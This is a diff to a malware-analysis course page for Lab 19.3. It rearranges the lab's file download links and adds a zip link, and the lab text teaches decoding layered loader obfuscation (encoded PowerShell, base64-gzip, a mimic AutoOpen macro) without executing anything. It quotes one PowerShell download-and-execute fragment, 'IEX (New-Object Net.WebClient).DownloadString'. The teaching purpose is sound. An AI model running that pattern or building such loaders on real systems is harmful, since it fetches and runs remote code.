@@ -99,6 +99,17 @@ At the end of the chain you want the payload download URL and how it runs the pa
 
 ## Lab
 
+<div class="lab-box">
+<div class="lab-head"><b>LAB 19.3</b>Download the source files for this lab</div>
+<div class="lab-files">
+<a class="lab-file lab-all" href="/assets/labs/19.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
+<a class="lab-file" href="/assets/labs/19.3/src/benign_macro.vba" download><i class="fa-solid fa-download"></i>src/benign_macro.vba</a>
+<a class="lab-file" href="/assets/labs/19.3/src/decode_layers.py" download><i class="fa-solid fa-download"></i>src/decode_layers.py</a>
+<a class="lab-file" href="/assets/labs/19.3/src/stage1_encoded.txt" download><i class="fa-solid fa-download"></i>src/stage1_encoded.txt</a>
+<a class="lab-file" href="/assets/labs/19.3/src/stage2_gzip_b64.txt" download><i class="fa-solid fa-download"></i>src/stage2_gzip_b64.txt</a>
+</div>
+</div>
+
 The goal of this lab is to practice stripping away a loader's obfuscation without ever executing it. Every sample here is harmless (it only prints text), but the point is to build the habit, which is to decode and read and never run. You need Python 3, and optionally `pip install oletools` if you want to try `olevba` on a macro. If you later move on to a real sample, do it in an isolated lab as covered in Lesson 0.3.
 
 There are four files. `stage1_encoded.txt` holds a string shaped like a `powershell -EncodedCommand` argument (base64 over UTF-16LE). `stage2_gzip_b64.txt` holds a base64-wrapped gzip pattern, the kind a multi-stage loader uses. `benign_macro.vba` is a harmless macro that mimics the structure of a real maldoc (an AutoOpen trigger, a string split into pieces). `decode_layers.py` is a reference script that decodes both encoded strings (it only prints, it never executes anything).
@@ -108,16 +119,6 @@ Start with `stage1_encoded.txt`. It's the argument that would follow `-enc`. Dec
 Next open `stage2_gzip_b64.txt` and recognize the gzip magic (`1f 8b`) once you base64 decode it, then finish decoding with gzip to get the command. Read `benign_macro.vba` and point out which part is the auto-exec trigger, which part is the string split apart to hide it, and where in a real maldoc the payload-downloading command would sit. If you have oletools installed, put this macro into an Office file (or use a known-safe sample) and run `olevba` to see how it flags AutoOpen. Finally check your work against the reference script by running `decode_layers.py`.
 
 Two questions to think about. If you came across `IEX (New-Object Net.WebClient).DownloadString('http://...')`, what would you replace `IEX` with to get the content of the next stage without running it? And why do loaders like to nest several layers of encoding instead of just one? Try it yourself before opening the solution.
-
-<div class="lab-box">
-<div class="lab-head"><b>LAB 19.3</b>source files</div>
-<div class="lab-files">
-<a class="lab-file" href="/assets/labs/19.3/src/benign_macro.vba" download><i class="fa-solid fa-file-code"></i>src/benign_macro.vba</a>
-<a class="lab-file" href="/assets/labs/19.3/src/decode_layers.py" download><i class="fa-solid fa-file-code"></i>src/decode_layers.py</a>
-<a class="lab-file" href="/assets/labs/19.3/src/stage1_encoded.txt" download><i class="fa-solid fa-file-lines"></i>src/stage1_encoded.txt</a>
-<a class="lab-file" href="/assets/labs/19.3/src/stage2_gzip_b64.txt" download><i class="fa-solid fa-file-lines"></i>src/stage2_gzip_b64.txt</a>
-</div>
-</div>
 
 <details class="lab-solution" markdown="1">
 <summary>Show solution</summary>
